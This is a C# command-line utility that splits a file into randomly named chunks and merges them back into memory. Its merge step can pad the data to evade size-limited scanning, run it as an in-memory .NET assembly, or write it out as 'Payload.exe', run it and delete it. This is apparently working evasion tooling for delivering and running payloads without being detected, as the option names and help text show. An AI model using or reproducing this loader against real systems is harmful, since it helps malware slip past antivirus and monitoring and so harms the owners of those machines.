using System;
using System.Linq;
using System.IO;
using System.Diagnostics;
using System.Reflection;
using CommandLine;
using System.Threading;
using System.Text.RegularExpressions;

namespace SplitandMerge
{
    class Program
    {
        [Verb("split", HelpText = "Split file into chunks" +
            "\nOutput file chunks will include an index number.")]
        public class SplitOptions
        {
            [Option('f', "file", Required = true, HelpText = "File to split into chunks")]
            public string Infile { get; set; }
            [Option('c', "chunks", Required = false, Default = 4, HelpText = "Set number of equal chunks to split the file into")]
            public int Chunks { get; set; }
            [Option('p', "pattern", Required = false, Default = "?????#chunk??.dat", HelpText = "Set file pattern for the chunk files " +
                "\n?s are replaced with random alpha characters" +
                "\n# is the location of the index number used for reconstruction ordering")]
            public string Filepattern { get; set; }
            [Option('o', "out", Required = false, Default = @".", HelpText = "Set output path")]
            public string Outpath { get; set; }
        }

        [Verb("merge", HelpText = "Merge file chunks into a memory stream " +
            "\nOptionally inflate the memory stream size " +
            "\nOptionally execute the memory stream if it is a .NET assembly " +
            "\nOptionally write inflated file to disk " +
            "\nOptionally run the file from disk instead of from memory " +
            "\nOptionally delete the file on disk")]
        public class MergeOptions
        {
            [Option('i', "inpath", Required = false, Default = @".", HelpText = "Set path of files to merge")]
            public string Inpath { get; set; }
            [Option('p', "pattern", Required = false, Default = "*chunk*", HelpText = "Set pattern to match for input files")]
            public string Pattern { get; set; }
            [Option('r', "resize", Required = false, HelpText = @"Optional. Resize\inflate the memorystream")]
            public bool Pad { get; set; }
            [Option('s', "size", Required = false, Default = 140, HelpText = "Pad memoystream until over this size in MB")]
            public int Padsize { get; set; }
            [Option('m', "memoryexecute", Required = false, HelpText = "Optional. Execute the loaded assembly in memory")]
            public bool Memoryexecute { get; set; }
            [Option('w', "write", Required = false, HelpText = "Optional. Write file to disk")]
            public bool Write { get; set; }
            [Option('o', "out", Required = false, Default = @".\Payload.exe", HelpText = "Optional. Set output file path and name")]
            public string Outfile { get; set; }
            [Option('e', "execute", Required = false, HelpText = "Optional. Execute the written file with Process.Start")]
            public bool Executefile { get; set; }
            [Option('d', "delete", Required = false, HelpText = "Optional. Delete the written file afterward")]
            public bool Deletefile { get; set; }
        }

        public static void Main(string[] args)
        {
            // Uncomment below to log output to a file instead of console
            /*
            string logfile = @"C:\temp\log.txt";
               
            try
            {
                FileInfo fileInfo = new FileInfo(logfile);
                if (!fileInfo.Directory.Exists) fileInfo.Directory.Create();
                FileStream filestream = new FileStream(logfile, FileMode.Append);
                var streamwriter = new StreamWriter(filestream);
                streamwriter.AutoFlush = true;
                Console.SetOut(streamwriter);
                Console.SetError(streamwriter);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Cannot Create Logfile: {0}", logfile);
            }
            */

            CommandLine.Parser.Default.ParseArguments<SplitOptions, MergeOptions>(args)
            .WithParsed<SplitOptions>(options => Split(options.Infile, options.Chunks, options.Filepattern, options.Outpath))
            
            .WithParsed<MergeOptions>(options => Merge(options.Inpath, options.Pattern, options.Pad, options.Padsize, options.Memoryexecute, options.Write, options.Outfile, options.Executefile, options.Deletefile));

            void Split(string inputFile, int chunksNumber, string filepattern, string outpath)
            {
                try
                {
                    using (Stream input = File.OpenRead(inputFile))
                    {
                        int BUFFER_SIZE = (int)input.Length/chunksNumber+1;
                        //int BUFFER_SIZE = chunkSize;
                        byte[] buffer = new byte[BUFFER_SIZE];

                        Console.WriteLine("[+] Opening file: {0}", inputFile);
                        Console.WriteLine("[+] Splitting file into {0} chunks of {1} bytes", chunksNumber, BUFFER_SIZE);

                        Random random = new Random();

                        string RandomString(int length)
                        {
                            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
                            return new string(Enumerable.Repeat(chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
                        }

                        int index = 0;
                        while (input.Position < input.Length)
                        {
                            string file = Regex.Replace(filepattern, @"\?", match => RandomString(1));

                            //using (Stream output = File.Create(outpath + @"\" + randprefix + index + suffix))
                            string indexfile = Regex.Replace(file, "#+", match => index.ToString());

                            using (Stream output = File.Create(outpath + @"\" + indexfile))
                            {
                                //Console.WriteLine("[+] Writing split file: {0}...", outpath + @"\" + randprefix + index + suffix);
                                Console.WriteLine("[+] Writing split file: {0}", indexfile);
                                int remaining = BUFFER_SIZE, bytesRead;
                                while (remaining > 0 && (bytesRead = input.Read(buffer, 0,
                                        Math.Min(remaining, BUFFER_SIZE))) > 0)
                                {
                                    output.Write(buffer, 0, bytesRead);
                                    remaining -= bytesRead;
                                }
                            }
                            index++;
                        }
                    }
                    Console.WriteLine("[+] Done");
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Error: {0}", ex.ToString());
                }

                //Environment.Exit(1);
            }

            void Merge(string inpath, string pattern, bool pad, int tosize, bool memoryexecute, bool write, string outfile, bool execute, bool deletefile)
            {
                try
                {
                    //recombining files into a memorystream
                    using (MemoryStream scm = new MemoryStream())
                    {
                        // Get Directory object
                        DirectoryInfo directoryInfo = new DirectoryInfo(inpath);
                        // Get file names from this directory that match a given pattern
                        string[] files = new DirectoryInfo(inpath).GetFiles(pattern).Select(fi => fi.Name).ToArray();
                        // Sort files number extracted from the file name
                        Array.Sort(files, (x, y) => StringComparer.OrdinalIgnoreCase.Compare(ExtractNumber(x), ExtractNumber(y)));

                        foreach (string file in files)
                        {
                            using (Stream input = File.OpenRead(inpath + "\\" + file))
                            {
                                Console.WriteLine("[+] Opening Chunk File {0}", file);
                                input.CopyTo(scm);
                                Console.WriteLine("[+] Adding {0} to memorystream...", file);
                            }
                        }

                        //padding out memorystream to larger size
                        if (pad)
                        {
                            var streamSize = scm.Length;
                            Console.WriteLine("[+] Memorystream original size {0} bytes", streamSize);
                            byte[] padding = new byte[tosize*1048576 - streamSize];
                            Console.WriteLine("[+] Null padding length {0} bytes", padding.Length);

                            do
                            {
                                scm.Write(padding, 0, (int)padding.Length);
                                streamSize = scm.Length;
                                Console.WriteLine("[+] Expanding memory stream size to {0} bytes", streamSize);
                            }
                            while (streamSize < padding.Length);

                            Console.WriteLine("[+] Memorystream final size {0} bytes", streamSize);
                        }

                        byte[] m_Bytes = scm.ToArray();
                        Console.WriteLine("[+] Creating byte array from memory stream...");

                        if (write)
                        {
                            File.WriteAllBytes(outfile, m_Bytes);
                            Console.WriteLine("[+] Writing file to: {0}", outfile);

                            if (execute)
                            {
                                Process.Start(outfile);
                                Console.WriteLine("[+] Executing file: {0}", outfile);
                            }

                            if (deletefile)
                            {
                                Thread.Sleep(5000);
                                File.Delete(outfile);
                                Console.WriteLine("[+] Deleting file: {0}", outfile);
                            }
                        }

                        //Loading byte array as a .NET assembly and invoking it in memory
                        if (memoryexecute)
                        {
                            var assembly = Assembly.Load(m_Bytes);
                            Console.WriteLine("[+] Loading byte array as Assembly...");
                            Console.WriteLine("[+] byte array size: {0}", m_Bytes.Length);
                            var entryPoint = assembly.EntryPoint;
                            Console.WriteLine("[+] Getting assembly entry point: {0}", assembly.EntryPoint);
                            var commandArgs = new string[] { null };
                            Console.WriteLine("[+] Command Arguments: {0}", commandArgs);
                            Console.WriteLine("[+] Invoking assembly entrypoint and arguments");
                            var returnValue = entryPoint.Invoke(null, new object[] { commandArgs });
                            Console.WriteLine("[+] Assembly Successfully Invoked");
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Error: {0}", ex.ToString());
                }

                //Environment.Exit(1);
            }

            //function to extract numbers from split files for sorting
            int ExtractNumber(string text)
            {
                Match match = Regex.Match(text, @"(\d+)");
                if (match == null)
                {
                    return 0;
                }

                int value;
                if (!int.TryParse(match.Value, out value))
                {
                    return 0;
                }

                return value;
            }
        }
    }
}